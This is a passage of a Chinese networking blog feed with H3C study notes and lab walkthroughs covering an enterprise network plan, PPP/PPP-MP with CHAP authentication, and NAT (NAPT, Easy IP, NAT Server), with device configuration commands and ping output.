align="center">&#x2F;</td><td align="center">&#x2F;</td></tr><tr><td align="center">核心层</td><td align="center">R2</td><td align="center">G0&#x2F;0</td><td align="center">10.0.0.9&#x2F;30</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">连接 SW2</td></tr><tr><td align="center">核心层</td><td align="center">R2</td><td align="center">G0&#x2F;1</td><td align="center">10.0.0.18&#x2F;30</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">连接 R3</td></tr><tr><td align="center">核心层</td><td align="center">R2</td><td align="center">G0&#x2F;2</td><td align="center">10.0.0.2&#x2F;30</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">连接 R1</td></tr><tr><td align="center">核心层</td><td align="center">R2</td><td align="center">loopback0</td><td align="center">10.1.1.2&#x2F;32</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td></tr><tr><td align="center">核心层</td><td align="center">R3</td><td align="center">G0&#x2F;0</td><td align="center">10.0.0.13&#x2F;30</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">连接 R1</td></tr><tr><td align="center">核心层</td><td align="center">R3</td><td align="center">G0&#x2F;1</td><td align="center">10.0.0.17&#x2F;30</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">连接 R2</td></tr><tr><td align="center">核心层</td><td align="center">R3</td><td align="center">G0&#x2F;2</td><td align="center">192.168.6.254&#x2F;30</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">连接服务器</td></tr><tr><td align="center">核心层</td><td align="center">R3</td><td align="center">loopback0</td><td align="center">10.1.1.3&#x2F;32</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td></tr></tbody></table><p>3.<strong>路由规划</strong></p><ol><li>汇聚层和核心层工作在三层网络中，使用 OSPF 协议来实现全网路由互通</li><li>核心层划分为骨干区域，汇聚层划分为非骨干区域，提高网络可扩展性，以便日后加入新的汇聚层模块</li><li>使用静默接口来避免不必要的路由协议报文冲击业务网段</li></ol><p>4.<strong>互联网接入规划</strong></p><ol><li>连接互联网的出口路由器通过配置并引入默认路由，来使所有节点具备访问互联网的路由信息</li><li>连接互联网的出口路由器配置 EASY IP 使内部私有地址可以访问互联网</li><li>服务器区只为公司内部提供服务，不允许访问互联网</li><li>使用 chap 验证来验证接入身份</li></ol><p>5.<strong>冗余及可靠性规划</strong></p><ol><li>接入层交换机双上行连接至汇聚层，使用 STP 来消除二层环路</li><li>接入层交换机连接终端的端口配置为边缘端口，加快 STP 的收敛速度</li><li>汇聚层交换机之间连接多条链路，使用链路聚合来实现链路冗余，同时增加传输带宽</li><li>连接公网使用 PPP-MP 来实现双线聚合，使访问互联网的流量负载分担</li><li>通过上述设计，公司内部任何一条链路故障都不会造成网络和业务中断</li></ol><p>6.<strong>管理性规划</strong></p><ol><li>所有设备开启 TELNET ，使运维人员可远程进行管理，提高管理效率</li><li>为了保证远程管理的安全性，通过 ACL 来限制只有运维人员的终端可以远程连接所有设备</li></ol><hr><h3 id="设备清单"><a href="#设备清单" class="headerlink" title="设备清单"></a>设备清单</h3><table><thead><tr><th align="center">序号</th><th align="center">名称</th><th align="center">品牌</th><th align="center">型号</th><th align="center">产品描述</th><th align="center">单位</th><th align="center">数量</th><th align="center">单价</th><th align="center">合计</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">二层交换机</td><td align="center">H3C</td><td align="center">S1526</td><td align="center">千兆以太口X24</td><td align="center">台</td><td align="center">6</td><td align="center">900</td><td align="center">5400</td></tr><tr><td align="center">2</td><td align="center">三层交换机</td><td align="center">H3C</td><td align="center">S5520V</td><td align="center">千兆以太口X24、万兆光口X2</td><td align="center">台</td><td align="center">2</td><td align="center">4500</td><td align="center">9000</td></tr><tr><td align="center">3</td><td align="center">路由器</td><td align="center">H3C</td><td align="center">MSR36-20</td><td align="center">千兆以太口X3、串口X2</td><td align="center">台</td><td align="center">3</td><td align="center">7000</td><td align="center">21000</td></tr></tbody></table><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PPP概述</title>
      <link href="/posts/60782"/>
      <url>/posts/60782</url>
      
        <content type="html"><![CDATA[<br /><br /><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li><code>点到点协议</code></li><li><code>在串行线路上运行的协议</code></li></ul><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li><code>支持身份验证</code></li><li><code>支持网络层地址自动协商</code></li></ul><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p><img src="/images/PPP%E6%A6%82%E8%BF%B0/01.jpg"></p><p><em>阶段1</em></p><ul><li><code>LCP(链路控制协议)阶段:链路状态协商</code></li></ul><p><em>阶段2</em></p><ul><li><code>验证阶段</code></li><li><code>可选</code></li></ul><p><em>阶段3</em></p><ul><li><code>NCP(网络控制协议)阶段:IP地址协商</code></li></ul><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p><em>验证方式</em></p><ul><li><em>PAP</em><ul><li><code>两次握手</code></li><li><code>用户名和密码在网络中明文传输</code></li></ul></li><li><em>CHAP</em><ul><li><code>三次握手</code></li><li><code>密码不在网络中传输，更安全</code></li></ul></li></ul><p><em>验证分类</em></p><ul><li><code>单向验证主验证方对被验证方进行验证</code></li><li><code>双向验证双方互相验证</code></li></ul><h3 id="PPP-MP"><a href="#PPP-MP" class="headerlink" title="PPP-MP"></a>PPP-MP</h3><p>定义</p><ul><li><code>把两台路由器之间的多条PPP链路捆绑成一条逻辑PPP链路</code></li></ul><p>功能</p><ul><li><code>实现链路冗余</code></li><li><code>添加链路带宽</code></li></ul><p>要点</p><ul><li><code>IP地址配置在MP口上</code></li><li><code>身份验证配置在物理口上</code></li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><code>[h3c-Serial1/0]ppp authentication-mode &#39;pap/chap&#39;#设置接口开启PPP验证，并指定验证方式</code></p><p><code>[h3c-Serial1/0]ppp pap local-user &#39;username&#39; password &#39;simple/cipher&#39; &#39;password&#39;#被验证方设置接口上用于pap验证的用户和密码</code></p><p><code>[h3c-Serial1/0]ppp chap user &#39;username&#39;#被验证方设置接口上用于chap验证的用户</code></p><p><code>[h3c-Serial1/0]ppp chap password &#39;simple/cipher&#39; &#39;password&#39;#被验证方设置接口上用于chap验证的密码</code></p><p><code>[h3c]interface mp-group &#39;group-number&#39;#创建PPP-MP口，进入MP口接口视图</code></p><p><code>[h3c-Serial1/0]ppp mp mp-group &#39;group-number&#39;#物理接口加入到MP口</code></p><p><strong><code>双向验证时，如果两端用于验证的密码一致时，则在PPP接口下只用指定的用户名，不用指定密码</code></strong></p>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PPP实验</title>
      <link href="/posts/52951"/>
      <url>/posts/52951</url>
      
        <content type="html"><![CDATA[<br /><br /><h2 id="PPP实验"><a href="#PPP实验" class="headerlink" title="PPP实验"></a>PPP实验</h2><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/PPP%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>1.R1 和 R2 使用 PPP 链路直连，R2 和 R3 把 2 条 PPP 链路捆绑为 PPP MP 直连</p><p>2.按照图示配置 IP 地址</p><p>3.R2 对 R1 的 PPP 进行单向 chap 验证</p><p>4.R2 和 R3 的 PPP 进行双向 chap 验证</p><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>1.<strong>R2 和 R3 上配置 PPP MP</strong></p><p><em>步骤 1：在 R2 上创建 MP-GROUP 口</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R2]int MP-group 1</span><br></pre></td></tr></table></figure><p><em>步骤 2：把 S1&#x2F;0 和 S2&#x2F;0 加入到上一步创建的 MP-GROUP口</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R2]interface s1/0</span><br><span class="line">[R2-Serial1/0]ppp mp MP-group 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R2]interface s2/0</span><br><span class="line">[R2-Serial2/0]ppp mp MP-group 1</span><br></pre></td></tr></table></figure><p><em>步骤 3：R3 上配置命令与 R2 一致，此处省略</em></p><p>2.<strong>按照图示配置 IP 地址</strong></p><p>　　<em>分析：如果 PPP 链路上配置了 PPP-MP，那么链路的 IP 地址就必须配置在 MP-GROUP 口上，而不是物理口上</em><br>　　<br><em>步骤 1：R1 和 R2 的直连链路 IP 地址配置略</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R1]int s 1/0</span><br><span class="line">[R1-Serial1/0]ip add 192.168.1.1 24</span><br><span class="line">[R2]int s 3/0</span><br><span class="line">[R2-Serial3/0]ip add 192.168.1.2 24</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 R2 和 R3 的 MP-GROUP 口上配置 IP 地址</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R2]interface MP-group 1</span><br><span class="line">[R2-MP-group1]ip address 192.168.2.2 24</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R3]interface MP-group 1</span><br><span class="line">[R3-MP-group1]ip address 192.168.2.3 24</span><br></pre></td></tr></table></figure><p>3.<strong>R2 对 R1 的 PPP 进行单向 chap 验证</strong></p><p>　　<em>分析：R2 对 R1 进行单向验证，表示 R2 是主验证方，R1 是被验证方。所以需要在 R2 上创建用于验证的用户</em><br>　　<br><em>步骤 1：在 R2 上创建用于验证 R1 的用户</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R2]local-user user1 class network </span><br><span class="line"> New local user added.</span><br><span class="line">[R2-luser-network-user1]password simple 123</span><br><span class="line">[R2-luser-network-user1]service-type ppp</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 R2 连接 R1 的接口上配置需要进行 PPP 验证，验证方式为 chap</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R2-Serial3/0]ppp authentication-mode chap  </span><br></pre></td></tr></table></figure><p><em>步骤 3：在 R1 连接 R2 的接口上配置用于验证的用户名和密码</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R1-Serial1/0]ppp chap user user1</span><br><span class="line">[R1-Serial1/0]ppp chap password simple 123</span><br></pre></td></tr></table></figure><p><em>步骤 4：关闭在开启 R1 和 R2 的 PPP 链路，检查验证是否能够通过（步骤略）</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[R1-Serial1/0]shutdown </span><br><span class="line">[R1-Serial1/0]undo shutdown</span><br><span class="line">[R1-Serial1/0]ping 192.168.1.2</span><br><span class="line">Ping 192.168.1.2 (192.168.1.2): 56 data bytes, press CTRL+C to break</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=0 ttl=255 time=1.000 ms</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=1 ttl=255 time=0.000 ms</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=2 ttl=255 time=1.000 ms</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=3 ttl=255 time=1.000 ms</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=4 ttl=255 time=0.000 ms</span><br><span class="line"></span><br><span class="line">--- Ping statistics for 192.168.1.2 ---</span><br></pre></td></tr></table></figure><p>4.<strong>R2 和 R3 的 PPP 进行双向 chap 验证</strong></p><p>　　<em>分析：双向验证意味着 R2 和 R3 双方都需要创建用于验证的用户，且需要在各自接口上配置对端的用户名<br>　　另外，虽然R2 和 R3 之间的 PPP 链路配置了 PPP-MP，但是身份验证仍然需要配置在物理接口上，所以 R2 和 R3 相连的所有 PPP 接口上都需要配置验证</em><br>　　<br><em>步骤 1：在 R2 和 R3上创建用户验证 R3 的用户</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R2]local-user user2 class network </span><br><span class="line"> New local user added.</span><br><span class="line">[R2-luser-network-user2]password simple 123</span><br><span class="line">[R2-luser-network-user2]service-type ppp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R3]local-user user2 class network </span><br><span class="line"> New local user added.</span><br><span class="line">[R3-luser-network-user2]password simple 123</span><br><span class="line">[R3-luser-network-user2]service-type ppp</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 R2 和 R3 相连的接口上配置需要进行 PPP 验证，验证方式为 chap，并配置对端验证本端的用户名</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R2-Serial1/0]ppp authentication-mode chap</span><br><span class="line">[R2-Serial1/0]ppp chap user user2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R2-Serial2/0]ppp authentication-mode chap</span><br><span class="line">[R2-Serial2/0]ppp chap user user2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R3-Serial1/0]ppp authentication-mode chap</span><br><span class="line">[R3-Serial1/0]ppp chap user user2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R3-Serial2/0]ppp authentication-mode chap</span><br><span class="line">[R3-Serial2/0]ppp chap user user2</span><br></pre></td></tr></table></figure><p><em>步骤 4：关闭在开启 R2 和 R3 的 PPP 链路，检查验证是否能够通过（步骤略）</em></p><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NAT实验</title>
      <link href="/posts/28371"/>
      <url>/posts/28371</url>
      
        <content type="html"><![CDATA[<br /><br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/NAT%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><blockquote><p>注：如无特别说明，同一网段中，IP 地址的主机位为其设备编号，如 R3 的 g0&#x2F;0 接口若在 <code>192.168.1.0/24</code> 网段，则其 IP 地址为 <code>192.168.1.3/24</code>，以此类推。此拓扑中 FTPA，PCA，PCB 使用路由器来模拟</p></blockquote><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>1.按照图示配置 IP 地址</p><p>2.私网 A 通过 R1 接入到互联网，私网 B 通过 R3 接入到互联网</p><p>3.私网 A 内部存在 Vlan10 和 Vlan20，通过 R1 上单臂路由访问外部网络</p><p>4.私网 A 通过 NAPT 使 Vlan10 和 Vlan20 都能够使用 R1 的公网地址访问互联网</p><p>5.私网 B 通过在 R3 上配置 EASY IP 访问互联网</p><p>6.私网 A 配置 NAT SERVER 把 FTPA 的 FTP 服务发布到公网，使 PCB 可以访问</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>1.<strong>配置 IP 地址部分</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[R1]int g 0/1</span><br><span class="line">[R1-GigabitEthernet0/1]ip add 100.1.1.1 24</span><br><span class="line"></span><br><span class="line">[R2]int g 0/0</span><br><span class="line">[R2-GigabitEthernet0/0]ip add 100.1.1.2 24</span><br><span class="line">[R2-GigabitEthernet0/0]int g 0/1</span><br><span class="line">[R2-GigabitEthernet0/1]ip add 100.2.2.2 24</span><br><span class="line"></span><br><span class="line">[R3]int g 0/0</span><br><span class="line">[R3-GigabitEthernet0/0]ip add 100.2.2.3 24</span><br><span class="line">[R3-GigabitEthernet0/0]int g 0/1</span><br><span class="line">[R3-GigabitEthernet0/1]ip add 192.168.1.254 24</span><br><span class="line"></span><br><span class="line">[PCB]int g 0/0</span><br><span class="line">[PCB-GigabitEthernet0/0]ip add 192.168.1.1 24</span><br><span class="line">[PCB-GigabitEthernet0/0]qu</span><br><span class="line">[PCB]ip route-static 0.0.0.0 0 192.168.1.254</span><br><span class="line"></span><br><span class="line">[FTP]int g 0/0</span><br><span class="line">[FTP-GigabitEthernet0/0]ip add 192.168.1.1 24</span><br><span class="line">[FTP-GigabitEthernet0/0]ip route-static 0.0.0.0 0 192.168.1.254</span><br><span class="line"></span><br><span class="line">[PCA]int g 0/0</span><br><span class="line">[PCA-GigabitEthernet0/0]ip add 192.168.2.1 24</span><br><span class="line">[PCA-GigabitEthernet0/0]ip route-static 0.0.0.0 0 192.168.2.254</span><br></pre></td></tr></table></figure><p>2.<strong>R1 和 R3 上配置默认路由指向公网</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R1]ip route-static 0.0.0.0 0 100.1.1.2</span><br><span class="line">[R3]ip route-static 0.0.0.0 0 100.2.2.2 </span><br></pre></td></tr></table></figure><p>3.<strong>私网 A 内部单臂路由配置部分</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[SWA]vlan 10</span><br><span class="line">[SWA-vlan10]port g 1/0/1</span><br><span class="line">[SWA-vlan10]vlan 20</span><br><span class="line">[SWA-vlan20]port g 1/0/2</span><br><span class="line">[SWA-vlan20]int g 1/0/3</span><br><span class="line">[SWA-GigabitEthernet1/0/3]port link-type trunk</span><br><span class="line">[SWA-GigabitEthernet1/0/3]port trunk permit vlan 10 20</span><br><span class="line"></span><br><span class="line">[R1]int g 0/0.1</span><br><span class="line">[R1-GigabitEthernet0/0.1]vlan-type dot1q vid 10</span><br><span class="line">[R1-GigabitEthernet0/0.1]ip add 192.168.1.254 24</span><br><span class="line">[R1-GigabitEthernet0/0.1]int g 0/0.2</span><br><span class="line">[R1-GigabitEthernet0/0.2]vlan-type dot1q vid 20</span><br><span class="line">[R1-GigabitEthernet0/0.2]ip add 192.168.2.254 24</span><br></pre></td></tr></table></figure><p>4.<strong>私网 A 通过 NAPT 使 Vlan10 和 Vlan20 都能够使用 R1 的公网地址访问互联网</strong></p><p><em>分析：根据需求得知，ACL 需要配置允许 <code>192.168.1.0/24</code> 和 <code>192.168.2.0/24</code> 网段；私网 A 只有 1 个公网地址可用，意味着创建的 NAT 地址池起始和结束地址就都是 <code>100.1.1.1</code></em></p><p><em>步骤 1：R1 上创建基本 ACL，允许 <code>192.168.1.0/24</code> 和 <code>192.168.2.0/24</code> 网段</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[R1]acl basic 2000</span><br><span class="line">[R1-acl-ipv4-basic-2000]rule permit source 192.168.1.0 0.0.0.255</span><br><span class="line">[R1-acl-ipv4-basic-2000]rule permit source 192.168.2.0 0.0.0.255</span><br></pre></td></tr></table></figure><p><em>步骤 2：R1 上创建 NAT 地址池，设置公网地址</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R1]nat address-group 1</span><br><span class="line">[R1-address-group-1]address 100.1.1.1 100.1.1.1</span><br></pre></td></tr></table></figure><p><em>步骤 3：在 R1 的公网接口上配置 NAPT</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R1]interface g0/1</span><br><span class="line">[R1-GigabitEthernet0/1]nat outbound 2000 address-group 1 </span><br></pre></td></tr></table></figure><p><em>步骤 4：在 PCA 上 Ping R3 的公网地址，测试是否可以访问互联网</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;PCA&gt;ping 100.2.2.3</span><br><span class="line">Ping 100.2.2.3 (192.168.2.10): 56 data bytes, press CTRL_C to break</span><br><span class="line">56 bytes from 100.2.2.3: icmp_seq=0 ttl=254 time=22.000 ms</span><br><span class="line">56 bytes from 100.2.2.3: icmp_seq=1 ttl=254 time=51.000 ms</span><br><span class="line">56 bytes from 100.2.2.3: icmp_seq=2 ttl=254 time=21.000 ms</span><br><span class="line">56 bytes from 100.2.2.3: icmp_seq=3 ttl=254 time=43.000 ms</span><br><span class="line">56 bytes from 100.2.2.3: icmp_seq=4 ttl=254 time=34.000 ms</span><br></pre></td></tr></table></figure><p>5.<strong>私网 B 通过在 R3 上配置 EASY IP 访问互联网</strong></p><p><em>分析：根据需求得知，ACL 需要配置允许 <code>192.168.1.0/24</code> 网段；使用 EASY IP，就无需配置 NAT 地址池，直接在公网接口上配置即可，EASY IP 会自动识别公网接口的 IP 地址</em></p><p><em>步骤 1：R3 上创建基本 ACL，允许 <code>192.168.1.0/24</code> 网段</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R3]acl basic 2000</span><br><span class="line">[R3-acl-ipv4-basic-2000]rule permit source 192.168.1.0 0.0.0.255</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 R3 的公网接口上配置 EASY IP</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R3]interface g0/0</span><br><span class="line">[R3-GigabitEthernet0/0]nat outbound 2000</span><br></pre></td></tr></table></figure><p><em>步骤 4：在 PCB 上 Ping R1 的公网地址，测试是否可以访问互联网</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;PCB&gt;ping 100.1.1.1</span><br><span class="line">Ping 100.1.1.1 (192.168.1.10): 56 data bytes, press CTRL_C to break</span><br><span class="line">56 bytes from 100.1.1.1: icmp_seq=0 ttl=254 time=32.000 ms</span><br><span class="line">56 bytes from 100.1.1.1: icmp_seq=1 ttl=254 time=29.000 ms</span><br><span class="line">56 bytes from 100.1.1.1: icmp_seq=2 ttl=254 time=41.000 ms</span><br><span class="line">56 bytes from 100.1.1.1: icmp_seq=3 ttl=254 time=33.000 ms</span><br><span class="line">56 bytes from 100.1.1.1: icmp_seq=4 ttl=254 time=34.000 ms</span><br></pre></td></tr></table></figure><p>6.<strong>私网 A 配置 NAT SERVER 把 FTPA 的 FTP 服务发布到公网，使 PCB 可以访问</strong></p><p><em>分析：根据需求得知，需要发布 FTPA 的 FTP 服务，也就是把 R1 的公网地址的 20 和 21 端口映射到 FTPA 的私网地址<br>   　　配置 FTP 服务步骤</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[FTP]ftp server enable</span><br><span class="line">[FTP]local-user zhangdaye</span><br><span class="line">New local user added.</span><br><span class="line">[FTP-luser-manage-zhangdaye]pass sim 123456789.</span><br><span class="line">[FTP-luser-manage-zhangdaye]service-type ftp</span><br><span class="line">[FTP-luser-manage-zhangdaye]authorization-attribute user-role level-15</span><br></pre></td></tr></table></figure><p><em>步骤 1：在 R1 的公网接口上配置 NAT SERVER，映射端口 20 和 21</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1-GigabitEthernet0/1]nat server protocol tcp global current-interface 20 21 inside 192.168.1.1 20 21</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 PCB 上测试是否能够通过 R1 的公网地址访问 FTPA 的 FTP 服务</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;PCB&gt;ftp 100.1.1.1</span><br><span class="line">Press CTRL+C to abort.</span><br><span class="line">Connected to 100.1.1.1 (100.1.1.1).</span><br><span class="line">220 FTP service ready.</span><br><span class="line">User (100.1.1.1:(none)): </span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NAT-网络地址转换</title>
      <link href="/posts/6976"/>
      <url>/posts/6976</url>
      
        <content type="html"><![CDATA[<br /><br /><h3 id="产生背景"><a href="#产生背景" class="headerlink" title="产生背景"></a>产生背景</h3><ul><li><code>IPv4公网地址资源耗尽</code></li><li><code>IPv6普及遥遥无期</code></li><li><code>子网划分杯水车薪</code></li></ul><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li><code>网络地址转换</code></li><li><code>通过把私有地址转换为公有地址，使私有IP地址主机可以访问互联网，来解决公网地址不够用的问题</code></li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>静态NAT</p><ul><li><code>把公有地址一对一的静态映射给私有地址使用</code></li></ul><p>基本NAT</p><ul><li><code>建立公有地址池，把地址池中的公有地址动态的映射给私有地址使用</code></li><li><code>本质上仍然是一对一的映射</code></li></ul><p>NAPT</p><ul><li><code>把公有地址和端口动态的映射给私有地址和端口，实现一个公有地址可以供多个私有地址同时使用访问互联网</code></li><li><code>转换源IP和源端口，数据回包还原目的IP和目的端口</code></li><li><code>SNAT(源地址转换)</code></li></ul><p>Easy IP</p><ul><li><code>NAPT的一种简易实现形式</code></li><li><code>适用于公网地址不固定的场景</code></li></ul><p>NAT Server</p><ul><li><code>把公网IP的某个端口固定映射到私网IP的某个端口，让公网上的用户可以主动访问私网中的服务</code></li><li><code>转换目的IP和目的端口，数据回包还原源IP和源端口</code></li><li><code>也称端口映射，DNAT（目的地址转换）</code></li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><code>[h3c]nat address-group &#39;group-number&#39;#创建NAT公网地址池</code></p><p><code>[h3c-address-group-1]address &#39;start-ip&#39; &#39;end-ip&#39;#设置地址池的地址范围</code></p><p><code>[h3c-GigabitEthernet0/0]nat outbound &#39;acl-number&#39; address-group 